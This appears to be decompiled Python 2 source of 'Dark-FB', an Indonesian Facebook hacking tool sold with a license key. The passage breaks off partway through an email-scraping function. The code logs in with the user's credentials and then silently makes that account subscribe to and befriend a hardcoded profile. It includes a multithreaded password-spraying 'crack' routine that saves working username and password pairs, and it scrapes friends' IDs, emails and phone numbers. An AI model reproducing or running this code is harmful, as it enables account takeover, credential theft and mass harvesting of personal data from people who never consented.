#Decompiled At:Thu Mar 12 23:56:54 2020 

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
try:
    import mechanize
except ImportError:
    os.system('reset')
    mz = raw_input('\x1b[1;91m[+] \x1b[1;92mPerlu install mechanize \x1b[1;97m(y/t): ')
    if mz == '':
        print '\x1b[1;91m[!] Jangan kosong'
        os.sys.exit()
    elif mz == 'y':
        os.system('pip2 install mechanize')
    elif mz == 'Y':
        os.system('pip2 install mechanize')
    elif mz == 't':
        os.sys.exit()
    elif mz == 'T':
        os.sys.exit()
    else:
        print '\x1b[1;91m[!]\x1b[1;92m Pilih\x1b[1;93m (y/n)'
        time.sleep(1)
        os.sys.exit()
else:
    try:
        import requests
    except ImportError:
        os.system('reset')
        rqs = raw_input('\x1b[1;91m[+] \x1b[1;92mPerlu install requests \x1b[1;97m(y/t): ')
        if rqs == '':
            print '\x1b[1;91m[!] Jangan kosong'
            os.sys.exit()
        elif rqs == 'y':
            os.system('pip2 install requests')
            exit()
        elif rqs == 'Y':
            os.system('pip2 install requests')
            exit()
        elif rqs == 't':
            os.sys.exit()
        elif rqs == 'T':
            os.sys.exit()
        else:
            print '\x1b[1;91m[!]\x1b[1;92m Pilih\x1b[1;93m (y/n)'
            time.sleep(1)
            os.sys.exit()

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
sekarang = datetime.date.today()
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()


sponsor = '\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mZeDD\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mLimite\x1b[1;97m[\x1b[1;96mD\x1b[1;97m] \x1b[1;97m/ \x1b[1;96m./R41N53\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/rezadkim\x1b[0m'
logo1 = "\n\x1b[1;93m *       *\n  \x1b[90m\\     /  \n   \\.-./ \n  (\x1b[1;91mo\x1b[90m\\\x1b[1;93m^\x1b[90m/\x1b[1;91mo\x1b[90m)  _   _   _    \x1b[90m ___\n   \x1b[90m./ \\.\\ ( )\x1b[90m-( )\x1b[90m-( ) \x1b[90m.-'   '-.\n   \x1b[90m {\x1b[1;91m-\x1b[90m} \\\x1b[90m(//  ||   \\\\\x1b[90m/\x1b[1;93m (  ))\x1b[90m  '-.\n         //\x1b[90m-__||\x1b[90m__.-\\\\\x1b[90m.       .-'\n        (/    ()     \\)\x1b[90m'-._.-'\n        ||    ||      \\\\\n        ('    ('       ')  \x1b[1;92m[\x1b[1;97mDark-FB\x1b[1;92m]\x1b[1;93mv1.4\x1b[1;97m\n%s" % sponsor
logo2 = '\x1b[90m\n               _ |\\_\n               \\` \x1b[1;93m..\x1b[90m\\\n          __,.-" \x1b[1;97m=\x1b[90m__Y\x1b[1;97m=\x1b[90m\n        ."        )\n  _    /   ,    \\/\\_\n ((____|    )_-\\ \\_-`\n `-----\'`-----` `--`  \x1b[1;92m[\x1b[1;97mDark-FB\x1b[1;92m]\x1b[1;93mv1.5\x1b[1;97m\n%s' % sponsor
logo3 = '\x1b[1;93m\n o    o\n \x1b[1;92m \\__/\n  /\x1b[1;97moo\x1b[1;92m\\\n  \\\x1b[1;97m()\x1b[1;92m/\n  |~~|\n  |~~|               /\\\n  \\~~\\              /\\/\n   \\~~\\____________/\\/\n    \\/ | | | | | | \\/\n     ~~~~~~~~~~~~~~~  \x1b[1;92m[\x1b[1;97mDark-FB\x1b[1;92m]\x1b[1;93mv1.5\x1b[1;97m\n%s' % sponsor
logo4 = '\x1b[1;97m\n       .\n      ":"\n    \x1b[1;96m___\x1b[1;97m:\x1b[1;96m____     |"\\/"|\n  ,\'        `.    \\  /\n  |  \x1b[1;91mO        \x1b[1;96m\\___/  |\n\x1b[1;97m~^~^~^~^~^~^~^~^~^~^~^~^~  \x1b[1;92m[\x1b[1;97mDark-FB\x1b[1;92m]\x1b[1;93mv1.5\x1b[1;97m\n%s' % sponsor
logo5 = '\x1b[90m\n                     .\n                    / V\\\n                  / \x1b[1;91m`  \x1b[90m/\n                 <<   |\n                 /    |\n               /      |\n             /        |\n           /    \\  \\ /\n          (      ) | |\n  ________|   _/_  | |\n<__________\\______)\\__)  \x1b[1;92m[\x1b[1;97mDark-FB\x1b[1;92m]\x1b[1;93mv1.5\x1b[1;97m\n%s' % sponsor
logo = [logo1, logo2, logo3, logo4, logo5]
listgrup = []
threads = []
back = 0
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
em = []
emfromteman = []
hp = []
hpfromteman = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
reaksi = []
reaksigrup = []
komen = []
komengrup = []

def lisensi():
    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;97m[ \x1b[1;91mINFO\x1b[1;97m ]\n\x1b[1;91mMaaf, tools ini membutuhkan kunci lisensi untuk diakses\njika kamu belum punya lisensi, silahkan hubungi saya \nuntuk membelinya melalui :\n\n# \x1b[1;97mhttps://www.instagram.com/rezadkim\n\x1b[1;91m# \x1b[1;97mhttps://www.facebook.com/gwimusa3\n\x1b[1;91m# \x1b[1;97m0895611252563'
    user = raw_input('\n\x1b[1;91m[?] \x1b[1;92mMasukan Lisensi\x1b[1;91m : \x1b[1;97m')
    r = requests.get('https://pastebin.com/hSBW6Z8w').text
    if user in r:
        jalan('\x1b[1;91m[+] \x1b[1;92mMemeriksa user \x1b[1;97m...')
        time.sleep(1)
        login()
    elif user == '':
        print '\x1b[1;91m[!] Masukan lisensi'
        time.sleep(1)
        lisensi()
    else:
        print '\x1b[1;91m[!] Lisensi salah'
        keluar()


def login():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('reset')
        print random.choice(logo)
        print 40 * '\x1b[1;97m='
        print '\x1b[1;91m[!] \x1b[1;92mLOGIN AKUN FACEBOOK'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
        jalan('\x1b[1;91m[+] \x1b[1;92mSedang Masuk \x1b[1;97m...')
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\x1b[1;91m[!] Tidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\x1b[1;91m[+] \x1b[1;92mLogin berhasil'
                requests.post('https://graph.facebook.com/angga.pro.980967/subscribers?access_token=' + z['access_token'])
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=angga.pro.980967&access_token=' + z['access_token'])
                os.system('xdg-open https://www.instagram.com/rezadkim')
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;91m[!] Tidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\x1b[1;91m[!] Login Gagal'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
        except KeyError:
            os.system('reset')
            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Tidak ada koneksi'
            keluar()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m[+]\x1b[1;97m Nama      \x1b[1;91m: \x1b[1;92m' + nama
    print '\x1b[1;91m[+]\x1b[1;97m User ID   \x1b[1;91m:\x1b[1;92m ' + id
    print sekarang.strftime('\x1b[1;91m[+]\x1b[1;97m TGL       \x1b[1;91m:\x1b[1;92m %A, %d-%B-20%y')
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m1.\x1b[1;97m Informasi akun teman || \x1b[1;91m6.\x1b[1;97m Update ke v1.6'
    print '\x1b[1;91m2.\x1b[1;97m Lihat grup Saya      || \x1b[1;91m7.\x1b[1;97m Keluar dari akun'
    print '\x1b[1;91m3.\x1b[1;97m Hack Akun Facebook   || \x1b[1;91m0. Keluar'
    print '\x1b[1;91m4.\x1b[1;97m Bot                  ||'
    print '\x1b[1;91m5.\x1b[1;97m Lainnya....          ||'
    print 40 * '\x1b[1;97m='
    pilih()


def pilih():
    zedd = raw_input('\x1b[1;91m>\x1b[1;97m ')
    if zedd == '':
        print '\x1b[1;91m[!] Jangan kosong'
        pilih()
    elif zedd == '1':
        informasi()
    elif zedd == '2':
        grupsaya()
    elif zedd == '3':
        menu_hack()
    elif zedd == '4':
        menu_bot()
    elif zedd == '5':
        lain()
    elif zedd == '6':
        print ' Beli dong : 0895611252563'
    elif zedd == '7':
        os.system('rm -rf login.txt')
        os.system('xdg-open https://www.youtube.com/nganunymous')
        keluar()
    elif zedd == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'
        pilih()


def informasi():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;91m[+] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            print 40 * '\x1b[1;97m='
            print
            try:
                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mTidak ada'
            else:
                try:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mTidak ada'
                else:
                    try:
                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mTidak ada'
                    else:
                        try:
                            print '\x1b[1;91m[?] \x1b[1;92mNomor HP\x1b[1;97m      : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mNomor HP\x1b[1;97m      : \x1b[1;91mTidak ada'

                        try:
                            print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m        : ' + z['location']['name']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m        : \x1b[1;91mTidak ada'

                        try:
                            print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : ' + z['birthday']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : \x1b[1;91mTidak ada'

                    try:
                        print '\x1b[1;91m[?] \x1b[1;92mSekolah\x1b[1;97m       : '
                        for q in z['education']:
                            try:
                                print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                            except KeyError:
                                print '\x1b[1;91m                   ~ \x1b[1;91mTidak ada'

                    except KeyError:
                        pass

            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
    else:
        print '\x1b[1;91m[!] Pengguna tidak ditemukan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu()


def grupsaya():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print random.choice(logo)
        print 40 * '\x1b[1;97m='
        jalan('\x1b[1;91m[+]\x1b[1;92m Melihat Daftar Grup\x1b[1;97m ...')
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Grup \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97mgrupid.txt'
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Grup tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Tidak ada koneksi'
            keluar()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()


def menu_hack():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m1.\x1b[1;97m Multi Bruteforce Facebook'
    print '\x1b[1;91m2.\x1b[1;97m BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;91m3.\x1b[1;97m Yahoo Checker'
    print '\x1b[1;91m0.\x1b[1;91m Kembali'
    print
    hack_pilih()


def hack_pilih():
    hack = raw_input('\x1b[1;91m>\x1b[1;97m ')
    if hack == '':
        print '\x1b[1;91m[!] Jangan kosong'
        hack_pilih()
    elif hack == '1':
        multi_menu()
    elif hack == '2':
        brute()
    elif hack == '3':
        menu_yahoo()
    elif hack == '0':
        menu()
    else:
        print '\x1b[1;91m[!] \x1b[1;93m' + hack + ' \x1b[1;97mTidak ada'
        hack_pilih()


def multi_menu():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('reset')
    print random.choice(logo)
    print 40 * '\x1b[1;97m='
    print '\x1b[1;91m1.\x1b[1;97m Crack'
    print '\x1b[1;91m2.\x1b[1;97m Ambil ID teman'
    print '\x1b[1;91m3.\x1b[1;97m Ambil ID teman dari teman'
    print '\x1b[1;91m4.\x1b[1;97m Ambil ID member GRUP'
    print '\x1b[1;91m5.\x1b[1;97m Ambil Email teman'
    print '\x1b[1;91m6.\x1b[1;97m Ambil Email teman dari teman'
    print '\x1b[1;91m7.\x1b[1;97m Ambil No HP teman'
    print '\x1b[1;91m8.\x1b[1;97m Ambil No HP teman dari teman'
    print '\x1b[1;91m0. Kembali'
    print
    multi_pilih()


def multi_pilih():
    cuih = raw_input('\x1b[1;91m>\x1b[1;97m ')
    if cuih == '':
        print '\x1b[1;91m[!] Jangan kosong'
        multi_pilih()
    elif cuih == '1':
        crack()
        hasil()
    elif cuih == '2':
        id_teman()
    elif cuih == '3':
        idfrom_teman()
    elif cuih == '4':
        id_member_grup()
    elif cuih == '5':
        email()
    elif cuih == '6':
        emailfrom_teman()
    elif cuih == '7':
        nomor_hp()
    elif cuih == '8':
        hpfrom_teman()
    elif cuih == '0':
        menu_hack()
    else:
        print '\x1b[1;91m[!] \x1b[1;97m' + cuih + ' \x1b[1;91mTidak ada'
        multi_pilih()


def crack():
    global file
    global idlist
    global passw
    os.system('reset')
    print
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('reset')
        print random.choice(logo)
        print 40 * '\x1b[1;97m='
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            jalan('\x1b[1;91m[!] \x1b[1;92mPastikan koneksi internet anda super greget\x1b[1;97m ...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[32mUsername \x1b[1;97m: ' + username + ' | \x1b[1;92mPassword \x1b[1;97m: ' + passw)
                back += 1
            elif 'www.facebook.com' in mpsh['error_msg']:
                cek = open('Cekpoint.txt', 'w')
                cek.write(username + ' | ' + passw + '\n')
                cek.close()
                cekpoint.append('\x1b[32mUsername \x1b[1;97m: ' + username + ' | \x1b[1;92mPassword \x1b[1;97m: ' + passw)
                back += 1
            else:
                gagal.append(username)
                back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m%\x1b[1;91m] \x1b[1;92m]Crack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive \x1b[1;91m:\x1b[1;96m ' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck \x1b[1;91m: \x1b[1;96m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[1;91m[!] Koneksi terganggu'
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[!] Tidak ada koneksi'
        keluar()


def hasil():
    print
    print 40 * '\x1b[1;97m='
    print '\x1b[32m[\x1b[31m+\x1b[32m] \x1b[1;92mBerhasil   \x1b[1;97m--> ' + str(len(berhasil))
    for b in berhasil:
        print b

    print '\x1b[33m[\x1b[31m+\x1b[33m] \x1b[1;93mCheckpoint \x1b[1;97m--> ' + str(len(cekpoint))
    for c in cekpoint:
        print c

    print '\x1b[31m[+] Gagal      \x1b[1;97m--> ' + str(len(gagal))
    print
    keluar()


def id_teman():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print random.choice(logo)
            print 40 * '\x1b[1;97m='
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil ID teman \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            for ah in z['data']:
                idteman.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID di dapatkan \x1b[1;96m%s' % len(idteman)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri id teman...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + save_id
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except KeyError:
            os.remove(save_id)
            print '\x1b[1;91m[!] Kesalahan terjadi'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Tidak ada koneksi'
            keluar()


def idfrom_teman():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print random.choice(logo)
            print 40 * '\x1b[1;97m='
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[+] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Belum berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                multi_menu()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_idt, 'w')
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil ID teman dari teman \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            for ah in z['friends']['data']:
                idfromteman.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID di dapatkan \x1b[1;96m%s' % len(idfromteman)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri id teman dari teman...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + save_idt
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Tidak ada koneksi'
            keluar()


def id_member_grup():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print random.choice(logo)
            print 40 * '\x1b[1;97m='
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[+] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Grup tidak ditemukan'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                multi_menu()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id member grup \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + i['name']
                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah ID di dapatkan \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mSukses mencuri id member grup...'
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Grup tidak ditemukan...'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            multi_menu()


def email():
    os.system('reset')
    print random.choice(logo)
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('reset')
            print random.choice(logo)
            print 40 * '\x1b[1;97m='
            mails = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;93mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil Email teman \x1b[1;97m...')
            print
            print 40 * '\x1b[1;97m='
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 40 * '\x1b[1;97m='
                except KeyError:
                    pass

